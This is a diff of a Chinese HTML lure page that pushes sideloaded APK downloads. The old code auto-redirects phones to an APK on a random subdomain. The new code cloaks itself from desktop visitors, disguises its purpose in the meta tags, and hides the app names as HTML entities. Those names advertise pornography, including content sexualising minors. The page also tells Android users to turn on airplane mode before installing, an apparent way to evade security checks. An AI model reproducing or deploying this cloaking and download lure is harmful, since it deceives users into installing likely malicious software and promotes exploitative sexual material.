@@ -1,65 +1,197 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-<meta http-equiv="Content-Type" content="text="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0;">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-<meta http-equiv="Cache-Control" content="no-transform">
-<title></title>
-<script type="text/javascript">
-function generateRandomTitle(length) {
-    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    var result = '';
-    for (var i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-function generateRandomDomain() {
-    var length = Math.floor(Math.random() * 4) + 3;
-    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    var domain = '';
-    
-    var hasLetter = false;
-    var hasNumber = false;
-    
-    while (!hasLetter || !hasNumber) {
-        domain = '';
-        hasLetter = false;
-        hasNumber = false;
-        
-        for (var i = 0; i < length; i++) {
-            var char = chars.charAt(Math.floor(Math.random() * chars.length));
-            domain += char;
-            
-            if (char >= 'a' && char <= 'z') {
-                hasLetter = true;
-            } else if (char >= '0' && char <= '9') {
-                hasNumber = true;
-            }
+    <meta charset="UTF-8">
+    <meta name="robots" content="nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>欢迎老司机</title>
+    <meta name="description" content="提供最新热门手机应用免费下载，包括社交、视频、工具、游戏等多种类型的安卓和iOS应用，安全可靠，高速下载。">
+    <meta name="keywords" content="手机应用下载,安卓软件,iOS应用,免费APP,热门应用,抖音下载,视频软件,社交应用">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <style>
+        * {
+            margin: 0;
+            padding: 0
         }
-    }
-    
-    return 'https://' + domain + '.hahyw.com/tie.apk';
-}
+        
+        .vwbg {
+            margin: 0 auto;
+            position: relative;
+            width: 100%;
+            max-width: 640px;
+            background-color: #efefef
+        }
+        
+        body {
+            font-family: Droid Sans, Helvetica, Arial;
+            text-align: center;
+            background: #222
+        }
+        
+        h1 {
+            line-height: 40px;
+            font-size: 12px;
+            color: #fff;
+            background: #1aad19
+        }
+        
+        .top {
+            padding: 15px 0 15px;
+            line-height: 33px;
+            background: #fffbbb
+        }
+        
+        .top h2 {
+            font-size: 19px;
+            color: #333
+        }
+        
+        .top i {
+            font-size: 14px;
+            color: #f10606;
+            padding-left: 8px;
+            font-style: normal
+        }
+        
+        .top p {
+            font-size: 15px;
+            line-height: 22px;
+            color: #888;
+            letter-spacing: 1px
+        }
+        
+        .main {
+            padding: 14px 0
+        }
+        
+        .xianlu {
+            font-size: 20px;
+            line-height: 45px;
+            margin: 0 auto;
+            color: #666
+        }
+        
+        .xianlu th {
+            font-weight: normal;
+            padding-right: 6px
+        }
+        
+        .xianlu td {
+            font-size: 20px
+        }
+        
+        .xianlu a {
+            color: #4285f4;
+            text-decoration: none
+        }
+        
+        .xianlu img {
+            width: 100%;
+            height: 100%;
+            transition: all 0.7s ease;
+        }
+        
+        .mybbs {
+            float: left;
+            width: 95%;
+            padding: .6rem 2.5%;
+            background-color: #fffbbb;
+            font-weight: bold;
+            text-align: center;
+            font-size: .75rem;
+            line-height: 1.1rem;
+            color: #f10606;
+            border-bottom: 270px solid #efefef;
+            overflow: hidden
+        }
+    </style>
+    <script>
+        (function() {
+            const mobileKeywords = [
+                'Android', 'webOS', 'iPhone', 'iPad', 'iPod',
+                'BlackBerry', 'Windows Phone', 'Mobile', 'Tablet'
+            ];
 
-var ua = navigator.userAgent;
-var ipad = ua.match(/(iPad).*OS\s([\d_]+)/),
-isIphone = ua.match(/(iPhone\sOS)\s([\d_]+)/),
-isAndroid = ua.match(/(Android)\s+([\d.]+)/),
-ismb = isIphone || ipad || isAndroid;
+            const isMobile = mobileKeywords.some(keyword =>
+                navigator.userAgent.includes(keyword)
+            );
 
-if(!ismb) {
-    window.location.href = "https://www.baidu.com/search/error.html";
-} else {
-    var randomDomain = generateRandomDomain();
-    window.location.href = randomDomain;
-}
+            if (!isMobile) {
+                window.location.replace("https://www.baidu.com/search/error.html");
+            }
+        })();
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var ua = navigator.userAgent.toLowerCase();
+            if (!!/tieba/i.test(ua) && /iPhone|iPad|iPod/i.test(ua)) {
+                document.body.innerHTML += '<div id="tieba_tip" style="z-index: 99999; opacity: 0.7; background-color: #000; left: 0; top: 0; position: fixed; width: 100%; height: 100%;"><img style="width: 70%; position: fixed; right: 0;" src="https://img20.360buyimg.com/openfeedback/jfs/t1/337883/39/7396/8521/68c27a8cF7818bf07/1789cccea48bb598.png" alt=""/></div>';
+            }
 
-document.title = generateRandomTitle(4);
-</script>
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const links = document.querySelectorAll('.xianlu a');
+
+            const androidUrls = [
+                "https://d33le1odkm8rvw.cloudfront.net?channel_code=FLM05S01",
+                "https://d59.ggtmuyh.cc/chan/GS2461/bNJjy",
+                "https://dbd1.heloiwxa.xyz/aff-cHTjC",
+                "https://d7ad4.hvvlaei.com/chan/GS1000/P7zt",
+                "https://8fc14.cmmyrgs.top/chan/jm1300/2CtC"
+            ];
+
+            const iosUrls = [
+                "https://d33le1odkm8rvw.cloudfront.net?channel_code=FLM05S01",
+                "https://d59.ggtmuyh.cc/chan/GS2461/bNJjy",
+                "https://dbd1.heloiwxa.xyz/aff-cHTjC",
+                "https://d7ad4.hvvlaei.com/chan/GS1000/P7zt",
+                "https://8fc14.cmmyrgs.top/chan/jm1300/2CtC"
+            ];
+
+            links.forEach((link, index) => {
+                link.href = isIOS ? iosUrls[index] : androidUrls[index];
+            });
+        });
+    </script>
 </head>
 <body>
+    <div class="vwbg">
+        <h1>下载不了的话请关闭wifi切换手机4G网络</h1>
+        <div class="top">
+            <p>下方五款产品不定时更新
+                <br>建议全部下载留下最爽滴
+            </p>
+        </div>
+        <div class="main"> <img class="lazy" data-original="" src="https://img.meituan.net/video/dbe7dbfde3644fa361badba707103340706568.gif" width="230px" height="190px" />
+            <table class="xianlu">
+                <tbody>
+                    <tr>
+                        <th>①-&#x65B0;&#x7248;&#x6210;&#x4EBA;&#x6296;&#x97F3;</th>
+                        <td><a href="#" target="_blank">点击下载</a></td>
+                    </tr>
+                    <tr>
+                        <th>②-&#x841D;&#x8389;&#x55B7;&#x6C34;&#x89C6;&#x9891;</th>
+                        <td><a href="#" target="_blank">点击下载</a></td>
+                    </tr>
+                    <tr>
+                        <th>③-&#x56FD;&#x4EA7;&#x7FD8;&#x81C0;&#x5927;&#x5976;</th>
+                        <td><a href="#" target="_blank">点击下载</a></td>
+                    </tr>
+                    <tr>
+                        <th>④-&#x771F;&#x5B9E;&#x592B;&#x59BB;&#x81EA;&#x62CD;</th>
+                        <td><a href="#" target="_blank">点击下载</a></td>
+                    </tr>
+                    <tr>
+                        <th>⑤-&#x8D85;&#x6C61;&#x9EC4;&#x6E38;&#x6F2B;&#x753B;</th>
+                        <td><a href="#" target="_blank">点击下载</a></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="mybbs">
+            <p>安卓手机下载成功后务必开启飞行模式再安装软件 ☑</p>
+        </div>
+    </div>
 </body>
 </html>
